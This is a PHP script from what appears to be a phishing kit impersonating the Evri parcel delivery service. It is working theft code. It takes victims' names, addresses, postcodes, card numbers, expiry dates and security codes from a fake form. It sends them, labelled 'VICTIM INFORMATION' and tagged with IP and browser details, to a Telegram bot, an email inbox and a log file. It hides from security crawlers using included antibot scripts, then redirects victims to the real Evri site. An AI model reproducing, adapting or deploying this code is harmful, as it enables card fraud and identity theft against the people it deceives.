<?php

session_start();
date_default_timezone_set('GMT'); 
error_reporting(0);

include('../Antibot/blockers.php');
include('../Antibot/detects.php');
include('../Antibot/new.php');
include('../Antibot/Bot-Crawler.php');
include('../Antibot/Dila_DZ.php');

include('../config.php');
include('../functions/get_browser.php');
include('../functions/get_ip.php');
$TIME_DATE = date('H:i:s d/m/Y');


$_SESSION['firstname'] = $_POST['firstname'];
$_SESSION['lastname'] = $_POST['lastname'];
$_SESSION['address'] = $_POST['address'];
$_SESSION['postcode'] = $_POST['postcode'];

$_SESSION['card_number'] = $_POST['card_number'];
$_SESSION['exp'] = $_POST['exp'];
$_SESSION['csc'] = $_POST['csc'];


	$Z118_MESSAGE .= "
	
	[ Evri Delivery ACCOUNT LOGIN]
	[ USER LOGIN INFORMATION]

	--------------------------------------------------

	[First name] = ".$_POST['firstname']."
	[Last name] = ".$_POST['lastname']."
	[Address] = ".$_POST['address']."
	[Postcode ] = ".$_POST['postcode']."

	--------------------------------------------------

	[Card number] = ".$_POST['card_number']."
	[Expiry] = ".$_POST['exp']."
	[Security code] = ".$_POST['csc']."

	--------------------------------------------------
	[VICTIM INFORMATION]
	
	[TIME/DATE]    = ".$TIME_DATE."
	[IP INFO] = http://ip-api.com/json/".$_SESSION['_ip_']."
	[REMOTE IP]    = ".$_SERVER['REMOTE_ADDR']."
	[BROWSER] = ".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."
	[BROWSER] = ".$_SERVER['HTTP_USER_AGENT']."
	
	";
	

		$data = [
			'text' => ''.$Z118_MESSAGE.'',
			'chat_id' => ''.$chat_id.''
		];
		$url = "https://api.telegram.org/bot".$bot_token."/sendMessage?";
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		$result = curl_exec($ch);
		curl_close($ch);
	
	
	if($save_results_to_cpanel == "on") {
		$res_file = fopen("../logs/User_Information.txt", "a");
		fwrite($res_file, $Z118_MESSAGE);
	}
	
		
	
		$Z118_SUBJECT = "✪ LOGIN FROM : ✪ ".$_POST['firstname']." ✪";
		$Z118_HEADERS .= "From:XD <X-hammer@logs.com>";
		$Z118_HEADERS .= $_POST['firstname']."\n";
		$Z118_HEADERS .= "MIME-Version: 1.0\n";
		$Z118_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
		@mail($Z118_EMAIL, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS);
	
	

		
		Header("Location: https://www.evri.com/track-a-parcel");
	
?>
